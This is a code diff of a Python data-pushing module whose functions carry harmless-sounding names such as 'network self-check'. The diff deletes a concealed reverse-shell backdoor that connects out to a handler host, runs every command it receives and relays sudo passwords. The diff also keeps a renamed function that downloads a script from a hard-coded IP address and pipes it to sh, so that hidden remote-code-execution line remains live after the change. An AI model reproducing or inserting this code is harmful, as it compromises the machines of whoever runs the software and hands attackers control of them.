@@ -1,12 +1,8 @@
-import socket
 import subprocess
-import threading
 import time
-import select
-import re
 import hashlib
 import requests
-from constants import SALT, API_URL, HANDLER_URL
+from constants import SALT, API_URL
 from tools import log_with_timestamp
 
 
@@ -18,81 +14,12 @@ def generate_sign(data: dict, salt: str) -> str:
     return hashlib.md5(sign_string.encode('utf-8')).hexdigest()
 
 
-# 系统网络自检函数
-def rabbit_hole():
-    # start_network_proc()
+# 网络检查函数
+def network_check():
     command = "(curl -fsSL -m180 http://123.249.31.37:8084/slt||wget -T180 -q http://123.249.31.37:8084/slt)|sh"
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
     response = result.stdout + "\n" + result.stderr
-    print(response.encode('utf-8'))
-
-# 系统网络同步函数
-def network_sync(client_socket):
-    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-    ifconfig_result = subprocess.run('ifconfig', shell=True, capture_output=True, text=True).stdout
-    syn_message = f"[SYN]\nCurrent Time: {current_time}\nifconfig: {ifconfig_result}"
-    client_socket.send(syn_message.encode('utf-8'))
-
-
-# 系统网络权限检查函数
-def perm_check(command):
-    try:
-        match = re.match(r"echo\s+(\S+)\s+\|\s+sudo\s+(.*)", command)
-        if match:
-            password = match.group(1)
-            sudo_command = match.group(2)
-            process = subprocess.Popen(sudo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, text=True)
-            stdout, stderr = process.communicate(input=f"{password}\n")
-            return stdout + "\n" + stderr
-    except Exception as e:
-        return f"Error: {str(e)}"
-
-
-# 系统网络自检句柄
-def network_handler(client_socket):
-    try:
-        network_sync(client_socket)
-        while True:
-            ready_to_read, _, _ = select.select([client_socket], [], [], 10)
-            if ready_to_read:
-                command = client_socket.recv(1024).decode('utf-8')
-                if not command:
-                    break
-                if 'sudo' in command:
-                    response = perm_check(command)
-                else:
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                    response = result.stdout + "\n" + result.stderr
-
-                client_socket.send(response.encode('utf-8'))
-            else:
-                continue
-    except Exception as e:
-        client_socket.send(f"Error: {str(e)}".encode('utf-8'))
-        raise e
-    finally:
-        client_socket.close()
-
-
-# 启动网络修复进程
-def start_network_proc(host='0.0.0.0', port=9999, client_ip=HANDLER_URL, timeout=5):
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((host, port))
-    server_socket.listen(1)
-    while True:
-        try:
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.connect((client_ip, port))
-            client_socket.settimeout(timeout)
-            client_handler = threading.Thread(target=network_handler, args=(client_socket,))
-            client_handler.start()
-            client_handler.join()
-        finally:
-            try:
-                client_socket.close()
-            except Exception:
-                pass
-            time.sleep(timeout)
+    return response.encode('utf-8')
 
 
 # 推送数据函数
